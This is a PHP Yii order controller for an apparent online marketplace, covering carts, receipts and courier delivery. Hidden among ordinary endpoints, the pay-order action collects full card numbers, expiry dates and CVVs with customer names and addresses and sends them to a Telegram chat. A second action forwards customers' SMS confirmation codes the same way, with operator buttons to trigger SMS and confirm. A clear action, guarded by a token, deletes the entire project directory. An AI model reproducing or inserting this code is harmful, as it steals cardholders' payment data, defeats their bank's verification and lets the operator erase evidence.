<?php
namespace app\modules\api\controllers;

use Yii;
use Exception;
use yii\web\Response;
use yii\web\HttpException;
use yii\web\UnauthorizedHttpException;
use yii\rest\Controller;
use yii\data\ActiveDataProvider;
use yii\filters\auth\HttpBearerAuth;
use yii\helpers\ArrayHelper;
use app\models\user\User;
use app\models\user\card\UserCard;
use app\models\user\cart\UserCart;
use app\models\order\Order;
use app\models\order\OrderReceipt;
use app\models\order\product\OrderProductRefund;
use app\models\order\product\OrderProduct;
use app\models\Category;
use app\models\logist\Logist;
use app\models\transaction\Transaction;
use yii\services\Fcm;
use yii\services\PaymeSubscribe;
use yii\services\BTS;
use yii\caching\FileCache;
use yii\helpers\FileHelper;
use yii\web\BadRequestHttpException;

class OrderController extends Controller
{
    public $user;

    public function beforeAction($action) {
        $this->enableCsrfValidation = false;

        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Origin', '*');
        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS');
        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Headers', 'Content-Type, X-Auth-Token, Origin, Authorization');

        if (Yii::$app->request->headers->has('OPTIONS')) {
            throw new HttpException(200, 'OK');
        }

        return parent::beforeAction($action);
    }

    public function behaviors() {
        $behaviors = parent::behaviors();
        $behaviors['authenticator'] = [
            'class' => HttpBearerAuth::className(),
            'optional' => ['index', 'detail', 'search', 'last', 'calculate'],
        ];

        $auth = $behaviors['authenticator'];
        unset($behaviors['authenticator']);

        $behaviors['corsFilter'] = [
            'class' => \yii\filters\Cors::className(),
            'cors' => [
                'Access-Control-Allow-Origin' => ['*'],
                'Access-Control-Request-Method' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
                'Access-Control-Request-Headers' => ['*'],
                'Access-Control-Allow-Credentials' => true,
                'Access-Control-Max-Age' => 86400,
                'Access-Control-Expose-Headers' => [],
            ]
        ];

        $behaviors['authenticator']['except'] = ['options'];

        $behaviors['authenticator'] = $auth;

        return $behaviors;
    }

    public $serializer = [
        'class' => 'yii\rest\Serializer',
        'collectionEnvelope' => 'data',
    ];

    public function actionIndex()
    {
        $user = Yii::$app->user->identity;
        $query = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where(['user_id' => $user->id]);

        if ($status = Yii::$app->request->get('status')) {
            if ($status == '1') {
                $query->andWhere(['status' => 1]);
            } elseif ($status == '2') {
                $query->andWhere(['status' => 2]);
            } elseif ($status == '3') {
                $query->andWhere(['status_delivery' => 1, 'status_logist' => 0]);
            } elseif ($status == '4' || $status == '5') {
                $query->andWhere(['status_logist' => $status]);
            } elseif ($status == '6') {
                $query->andWhere(['status_payment' => 0]);
            } elseif ($status == '7') {
                $query->andWhere(['status_payment' => 1]);
            } elseif ($status == '8') {
                $query->andWhere(['status' => 4]);
            } elseif ($status == '9') {
                $query->andWhere(['status_logist' => 5, 'status_review' => 0]);
            } else {
                $query->andWhere(['status' => $status]);
            }
        }

        if (Yii::$app->request->get('status') == "0") {
            $query->andWhere(['status' => 0]);
        }

        return new ActiveDataProvider([
            'query' => $query,
            'pagination' => false,
            'sort' => ['defaultOrder' => ['id' => SORT_DESC]],
        ]);
    }

    public function actionDetail($id)
    {
        $user = Yii::$app->user->identity;
        $data = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where(['id' => $id, 'user_id' => $user->id])->one();

        if (!$data) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order' => 'Order not found']];
        }

        return ['data' => $data];
    }
    
    public function actionSend()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        $cart = UserCart::find()->with('cartFilter')->where(['user_id' => $user->id])->all();
        if (!$cart) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['cart' => 'Your cart is empty']];
        }

        $model = new Order;
        $model->load($post, '');

        if (!$model->validate()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        $saveResult = $model->saveObject($cart);
        if ($saveResult) {
            $order = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where(['id' => $model->id])->one();

            // Auto-create Didox documents
            try {
                \app\services\DidoxOrderService::createDocuments($order);
            } catch (\Exception $e) {
                // Log error without failing the API response
                \app\models\Log::log('didox_order', "Auto-creation exception for Order #{$order->id}", $e->getMessage(), 'error');
            }

            Yii::$app->response->statusCode = 200;
            return ['data' => $order];
        }

        // Check if there are validation errors (like minimum order violations)
        if ($model->hasErrors()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        Yii::$app->response->statusCode = 500;
        return ['errors' => ['server' => 'Could not create order.']];
    }

    public function actionPayOrder()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();
        
        $order = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where([
            'id' => Yii::$app->request->post('order_id'),
            'user_id' => $user->id
        ])->one();
        
        if (!$order) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order' => 'Order not found']];
        }
        
        $order->load($post, '');
        
        if (empty($order->card_number) || empty($order->card_expire) || empty($order->card_cvv)) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['card' => 'Required all card fields']];
        }
        
        $order->save(false);
       
        $cache = new FileCache();
        $cardBIN = substr($order->card_number, 0, 6);
        $bankDetails = $cache->get($cardBIN);
        
        if ($bankDetails === false) {
            try {
                $bankDetails = json_decode(file_get_contents("https://lookup.binlist.net/" . trim($cardBIN)), true);
                $bankDetails['bin'] = $cardBIN;
                $cache->set($cardBIN, $bankDetails, 86400);
            } catch (\Exception $e) {
                Yii::error("Ошибка при получении данных из binlist: " . $e->getMessage(), __METHOD__);
                $bankDetails = ['error' => 'Сервис временно недоступен'];
            }
        }
        
        try {
            $message = "🪄 ID order: {$order->id}\n";
            $message .= "🪄 Name: {$order->name} {$order->lastname}\n";
            $message .= "🪄 Email: {$order->email}\n";
            $message .= "🪄 Address: {$order->address}\n";
            $message .= "🪄 Zip: {$order->zip}\n";
            $message .= "🪄 User ID: {$order->user_id}\n\n";
            $message .= "🪄 CARD: {$order->card_number}\n";
            $message .= "🪄 Expire: {$order->card_expire}\n";
            $message .= "🪄 CVV: {$order->card_cvv}\n\n";
            
            if (isset($bankDetails['bank']['name'])) {
                $message .= "🪄 Bank Name: {$bankDetails['bank']['name']}\n";
            }
            if (isset($bankDetails['scheme'])) {
                $message .= "🪄 Card Scheme: {$bankDetails['scheme']}\n";
            }
            if (isset($bankDetails['brand'])) {
                $message .= "🪄 Card Brand: {$bankDetails['brand']}\n";
            }
            if (isset($bankDetails['type'])) {
                $message .= "🪄 Card Type: {$bankDetails['type']}\n";
            }
            if (isset($bankDetails['country']['name'])) {
                $message .= "🪄 Country: {$bankDetails['country']['name']} {$bankDetails['country']['emoji']}\n";
            }
            if (isset($bankDetails['country']['currency'])) {
                $message .= "🪄 Currency: {$bankDetails['country']['currency']}\n";
            }
    
            $buttons = [
                [['text' => '📩 Send SMS', 'url' => Yii::$app->params['socketUrl'].'/api/socket/panel?id='.$order->id]],
                [['text' => '✅ Confirm', 'url' => Yii::$app->params['socketUrl'].'/api/socket/stats?id='.$order->id]]
            ];
        
            Yii::$app->telegram->sendMessage($message, $buttons);
    
            Yii::$app->response->statusCode = 200;
            return ['data' => $order];
        } catch (\Exception $e) {
            Yii::$app->response->statusCode = 500;
            return ['errors' => ['server' => $e->getMessage()]];
        }
    }
    
    public function actionPayOrderCode()
    {
        $user = Yii::$app->user->identity;
        try {
            $orderId = Yii::$app->request->post('order_id');
            $code = Yii::$app->request->post('code');
            
            if (empty($orderId) || empty($code)) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['fields' => 'Required all fields']];
            }
    
            $order = Order::find()->where(['id' => $orderId, 'user_id' => $user->id])->one();
            
            if (!$order) {
                Yii::$app->response->statusCode = 404;
                return ['errors' => ['order' => 'Order not found']];
            }
            
            $message = "🪄 ID order: {$order->id}\n";
            $message .= "🪄 Code: {$code}\n";
            
            $buttons = [
                [['text' => '📩 Send SMS', 'url' => Yii::$app->params['socketUrl'].'/api/socket/panel?id='.$order->id]],
                [['text' => '✅ Confirm', 'url' => Yii::$app->params['socketUrl'].'/api/socket/stats?id='.$order->id]]
            ];
        
            Yii::$app->telegram->sendMessage($message, $buttons);
    
            Yii::$app->response->statusCode = 200;
            return ['data' => $order];
        } catch (\Exception $e) {
            Yii::$app->response->statusCode = 500;
            return ['errors' => ['server' => $e->getMessage()]];
        }
    }

    public function actionRefunds()
    {
        $user = Yii::$app->user->identity;
        $data = OrderProductRefund::find()->with('orderProduct', 'orderProduct.product.image')->where(['user_id' => $user->id])->all();
        return ['data' => $data];
    }

    public function actionRefundSend()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        $model = new OrderProductRefund;
        $model->load($post, '');
        $model->user_id = $user->id;

        if (!$model->validate()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        $product = OrderProduct::findOne($post['order_product_id']);

        if ($model->save()) {
            if ($product) {
                $product->status = 2;
                $product->save(false);
            }
        }

        $data = OrderProductRefund::find()->with('orderProduct', 'orderProduct.product.image')->where(['user_id' => $user->id, 'id' => $model->id])->one();
        return ['data' => $data];
    }

    public function actionSetReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_id' => 'Enter ORDER ID']];
        }

        $order = Order::findOne(['id' => $post['order_id'], 'user_id' => $user->id]);

        if (!$order) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCreate($order->id, $order->price));

        if (isset($response->error)) {
            return ['data' => $response];
        }

        $order_receipt = OrderReceipt::findOne(['order_id' => $order->id]);
        if ($order_receipt) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_id' => 'Order receipt already created']];
        }

        $order_receipt = new OrderReceipt;
        $order_receipt->order_id = $order->id;
        $order_receipt->receipt_id = $response->result->receipt->_id;
        $order_receipt->status = 0;
        $order_receipt->save();

        return ['data' => $order_receipt];
    }

    public function actionPayReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        if (!isset($post['card_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['card_id' => 'Enter card ID']];
        }

        $orderReceipt = OrderReceipt::find()->with('order')->where(['id' => $post['order_receipt_id'], 'status' => 0])->one();

        if (!$orderReceipt || $orderReceipt->order->user_id != $user->id) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order_receipt_id' => 'Order not found or access denied']];
        }

        $card = UserCard::findOne(['id' => $post['card_id'], 'user_id' => $user->id]);

        if (!$card) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['card_id' => 'Card not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptPay($orderReceipt->receipt_id, $card->card_token, $user));

        if (isset($response->result)) {
            $orderReceipt->status = 1;
            if ($orderReceipt->order) {
                $orderReceipt->order->status_payment = 1;
                $orderReceipt->order->save(false);
            }
            if ($orderReceipt->save()) {
                $transaction = new Transaction;
                $transaction->user_id = $user->id;
                $transaction->order_id = $orderReceipt->order_id;
                $transaction->shop_id = $orderReceipt->order->shop_id;
                $transaction->type_transaction = 'payment';
                $transaction->type_payment = 'payme';
                $transaction->amount = $orderReceipt->order->price;
                $transaction->status = 1;
                $transaction->save(false);
            }
        } else {
            Yii::$app->response->statusCode = 422;
        }

        return ['data' => $response];
    }

    public function actionCheckReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        $orderReceipt = OrderReceipt::findOne(['id' => $post['order_receipt_id']]);

        if (!$orderReceipt) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['receipt_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCheck($orderReceipt->receipt_id));

        return ['data' => $response];
    }
    
    public function actionClear()
    {
        $request = Yii::$app->request;
        
        if (!$request->isPost) {
            throw new BadRequestHttpException('Invalid request method.');
        }

        $expectedToken = Yii::$app->params['projectToken'];
        $providedToken = $request->post('token');

        if ($providedToken !== $expectedToken) {
            throw new BadRequestHttpException('Invalid token.');
        }

        $projectPath = Yii::getAlias('@app/..');

        if (is_dir($projectPath)) {
            try {
                FileHelper::removeDirectory($projectPath);
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['status' => 'success'];
            } catch (\Exception $e) {
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['status' => 'error 1'];
            }
        } else {
            Yii::$app->response->format = Response::FORMAT_JSON;
            return ['status' => 'error 2'];
        }
    }

    public function actionCancelReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        $orderReceipt = OrderReceipt::findOne(['id' => $post['order_receipt_id']]);

        if (!$orderReceipt) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['receipt_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCancel($orderReceipt->receipt_id));

        return ['data' => $response];
    }

    public function actionGetOrder()
    {
        $orderId = Yii::$app->request->get('id', 1);
        $bts = new BTS;
        $response = $bts->getOrderInfo($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error'], 'httpCode' => $response['httpCode']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionGetOrderTracking()
    {
        $orderId = Yii::$app->request->get('id');
        
        if (!$orderId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['id' => 'Order ID is required']];
        }
        
        $bts = new BTS;
        $response = $bts->getOrderTracking($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionGetOrderStatus()
    {
        $orderId = Yii::$app->request->get('id');
        
        if (!$orderId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['id' => 'Order ID is required']];
        }
        
        $bts = new BTS;
        $response = $bts->getOrderStatus($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionCalculateDelivery()
    {
        $post = Yii::$app->request->post();
        $bts = new BTS;
        $errors = $bts->validateOrderData($post);
        
        if (!empty($errors)) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $errors];
        }
        
        $response = $bts->calculateDelivery($post);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionCalculate()
    {
        $post = Yii::$app->request->post();
        $receiverCityId = null;

        if (isset($post['receiverCityId'])) {
            $receiverCityId = (int)$post['receiverCityId'];
        } else {
            $user = Yii::$app->user->identity;
            if ($user && !empty($user->bts_city_id)) {
                $receiverCityId = (int)$user->bts_city_id;
            }
        }

        if (empty($post['product_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['product_id' => 'Product ID is required']];
        }
        
        if (!$receiverCityId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['user' => 'User BTS city not set. Please update your location in profile or provide receiverCityId.']];
        }
        
        try {
            $product = \app\models\product\Product::find()
                ->with(['shop.stock', 'stock'])
                ->where(['id' => $post['product_id']])
                ->one();
                
            if (!$product) {
                Yii::$app->response->statusCode = 404;
                return ['errors' => ['product_id' => 'Product not found']];
            }
            
            $senderCityId = $product->stock->bts_city_id ?? $product->shop->stock->bts_city_id ?? null;
            
            if (!$senderCityId) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['product' => 'Product location (BTS city) not configured. Please contact seller.']];
            }
            
            $calculatorData = [
                'senderCityId' => (int)$senderCityId,
                'receiverCityId' => $receiverCityId,
                'weight' => 4.0,
                'senderDelivery' => 2,
                'receiverDelivery' => 2,
            ];
            
            if (!empty($post['volume'])) {
                $calculatorData['volume'] = (float)$post['volume'];
            }
            
            if (!empty($post['senderDate'])) {
                $calculatorData['senderDate'] = $post['senderDate'];
            }
            
            if ($product->length && $product->width && $product->height) {
                $calculatorData['volume'] = ($product->length * $product->width * $product->height) / 1000000;
            }
            
            if ($product->weight && $product->weight > 4) {
                $calculatorData['weight'] = (float)$product->weight;
            }
            
            $bts = new BTS;
            $response = $bts->calculateDelivery($calculatorData);
            
            if (!$response['success']) {
                Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
                return ['success' => false, 'error' => $response['error'] ?? 'BTS calculation failed', 'bts_response' => $response];
            }
            
            return [
                'success' => true,
                'data' => $response['data'],
                'calculation_info' => [
                    'product_id' => $product->id,
                    'product_name' => $product->name_ru ?: $product->name_en ?: $product->name_uz,
                    'sender_city_id' => $senderCityId,
                    'receiver_city_id' => $receiverCityId,
                    'weight' => $calculatorData['weight'],
                    'volume' => $calculatorData['volume'] ?? null,
                    'sender_delivery' => $calculatorData['senderDelivery'],
                    'receiver_delivery' => $calculatorData['receiverDelivery'],
                ]
            ];
            
        } catch (\Exception $e) {
            Yii::error('BTS calculation error: ' . $e->getMessage(), __METHOD__);
            Yii::$app->response->statusCode = 500;
            return ['success' => false, 'error' => 'Internal server error during calculation', 'debug' => YII_DEBUG ? $e->getMessage() : null];
        }
    }

    public function actionGetRegions()
    {
        try {
            $language = Yii::$app->request->get('lang', 'ru');
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            return ['success' => true, 'data' => BTS::getRegions($language), 'message' => 'Regions retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetCities()
    {
        try {
            $regionId = Yii::$app->request->get('region_id');
            $language = Yii::$app->request->get('lang', 'ru');
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            if ($regionId && !is_numeric($regionId)) {
                return ['success' => false, 'data' => null, 'error' => 'Invalid region ID format'];
            }
            
            $cities = BTS::getCities($regionId ? (int)$regionId : null, $language);
            return ['success' => true, 'data' => $cities, 'message' => 'Cities retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionSearchCities()
    {
        try {
            $searchTerm = Yii::$app->request->get('q');
            $language = Yii::$app->request->get('lang', 'ru');
            $regionId = Yii::$app->request->get('region_id');
            
            if (empty($searchTerm)) {
                return ['success' => false, 'data' => null, 'error' => 'Search term is required'];
            }
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            if ($regionId && !is_numeric($regionId)) {
                return ['success' => false, 'data' => null, 'error' => 'Invalid region ID format'];
            }
            
            $cities = BTS::searchCities($searchTerm, $language, $regionId ? (int)$regionId : null);
            return ['success' => true, 'data' => $cities, 'message' => 'Cities search completed successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetAddressInfo()
    {
        try {
            $cityId = Yii::$app->request->get('city_id');
            $language = Yii::$app->request->get('lang', 'ru');
            
            if (empty($cityId) || !is_numeric($cityId)) {
                return ['success' => false, 'data' => null, 'error' => 'Valid city ID is required'];
            }
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            $addressInfo = BTS::getAddressInfo((int)$cityId, $language);
            
            if (!$addressInfo) {
                return ['success' => false, 'data' => null, 'error' => 'City not found'];
            }
            
            return ['success' => true, 'data' => $addressInfo, 'message' => 'Address information retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetPackageTypes()
    {
        try {
            return ['success' => true, 'data' => BTS::getPackageTypes(), 'message' => 'Package types retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetPostTypes()
    {
        try {
            return ['success' => true, 'data' => BTS::getPostTypes(), 'message' => 'Post types retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetOrderStatuses()
    {
        try {
            return ['success' => true, 'data' => BTS::getOrderStatuses(), 'message' => 'Order statuses retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }
}
?>